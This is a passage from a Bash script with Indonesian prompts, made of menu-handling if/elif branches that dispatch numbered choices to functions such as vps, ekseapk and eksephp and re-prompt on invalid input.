
            else
            clear
            echo $hi"masukan input yang benar.."
            sleep 3
            clear
            _pill


            fi

elif [ $pi = "3" ];
then
eks
            if [ $pi = "1" ];
            then
            vps
            ekseapk

            elif [ $pi = "2" ];
            then
            vps
            eksepy

            elif [ $pi = "3" ];
            then
            vps
            eksephp

            elif [ $pi = "0" ];
            then
            _dua
	    _pill


            else
	    clear
            echo "masukan pilihan antara 1-3"
            sleep 3
	    clear
	    for i in ulang
	    do
		echo $eks
	    done
            eks

            fi

elif [ $pi = "4" ];
then
_tiga

elif [ $pi = "5" ]:
then
clear
log
echo $pu
exit

elif [ $pi = "0"];
then
clear
fungsi

else
clear
echo "masukan input yang benar.."
sleep 3
clear
_pill

fi
}


fungsi(){
awal
if [ $pilih = "1" ];
then
_satu



elif [ $pilih = "2" ];
then
clear
_pill

elif [ $pilih = "3" ];
then
clear
_tiga


elif [ $pilih = "4" ];
then
clear
_empat

elif [ $pilih = "0" ];
then
clear
log
echo
exit


else
clear
echo "masukan input yang benar.."
sleep 3
clear
for i in ulang
do
	echo $fungsi
done
fungsi

fi
}

fungsi
